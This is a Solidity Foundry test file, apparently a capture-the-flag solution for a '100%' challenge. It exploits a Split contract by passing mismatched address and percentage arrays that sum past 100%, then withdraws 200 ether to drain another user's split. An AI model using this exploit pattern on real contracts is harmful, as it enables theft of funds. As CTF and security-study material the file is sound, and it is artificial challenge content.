// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/4.100%/Split.sol";
import "../src/4.100%/Challenge.sol";

contract OneHundredPercentTest is Test {
    Split split;
    Challenge challenge;
    address public deployer;
    address public hacker;
    uint256 public immutable DEFAULT_HACKER_BALANCE = 100 ether;
    address[] addrs = new address[](2);
    uint32[] percents = new uint32[](2);

    function setUp() public {
        hacker = makeAddr("hacker");
        vm.deal(hacker, DEFAULT_HACKER_BALANCE);
        split = new Split();
        // address[] memory addrs = new address[](2);
        addrs[0] = address(0x000000000000000000000000000000000000dEaD);
        addrs[1] = address(0x000000000000000000000000000000000000bEEF);
        //uint32[] memory percents = new uint32[](2);
        percents[0] = 5e5;
        percents[1] = 5e5;

        uint256 id = split.createSplit(addrs, percents, 0);

        Split.SplitData memory splitData = split.splitsById(id);
        splitData.wallet.deposit{value: 100 ether}();
    }

    function testExploitOneHundredPercent() public {
        Split.SplitData memory splitData = split.splitsById(0);
        uint256 walletBalance = address(splitData.wallet).balance;
        console.log("WalletBalance_BEGIN", walletBalance);

        vm.startPrank(hacker);
        address[] memory myAddrs = new address[](2);
        myAddrs[0] = address(hacker);
        myAddrs[1] = address(0x00000000000000000000000000000000001E8480); // 2e6 or 200%
        address[] memory myAddrs2 = new address[](1);
        myAddrs2[0] = address(hacker);
        uint32[] memory myPercents = new uint32[](3);
        myPercents[0] = 2e6; // 200%
        myPercents[1] = 5e5; // 50%
        myPercents[2] = 5e5; // 50%
        split.distribute(0, addrs, percents, 0, IERC20(address(0)));
        uint256 walletBalance2 = address(splitData.wallet).balance;

        console.log("walletBalance At first distribute:", walletBalance2);
        console.log("splitBalanceAt first distribute:", uint256(address(split).balance));

        uint256 myId = split.createSplit(myAddrs, percents, 0); // create a new Split
        Split.SplitData memory mySplit = split.splitsById(myId);
        mySplit.wallet.deposit{value: 100 ether}(); // deposit 100 ETH. The 2 times 100 is 200.
        split.distribute(myId, myAddrs2, myPercents, 0, IERC20(address(0)));
        uint256 walletBalance3 = address(splitData.wallet).balance;

        console.log("walletBalance At Secnod distribute:", walletBalance3);
        console.log("splitBalanceAt Second distribute:", uint256(address(split).balance));
        IERC20[] memory token = new IERC20[](1);
        uint256[] memory amount = new uint256[](1);
        token[0] = IERC20(address(0));
        amount[0] = 200 ether;

        split.withdraw(token, amount); // drain the first Split
        validation();
        vm.stopPrank();
    }

    function validation() public view {
        Split.SplitData memory splitData = split.splitsById(0);

        if (address(split).balance == 0 && address(splitData.wallet).balance == 0) {
            console.log(StdStyle.green("is Solved: True"));
        } else {
            console.log(StdStyle.red("is Solved: False"));
        }
    }
}
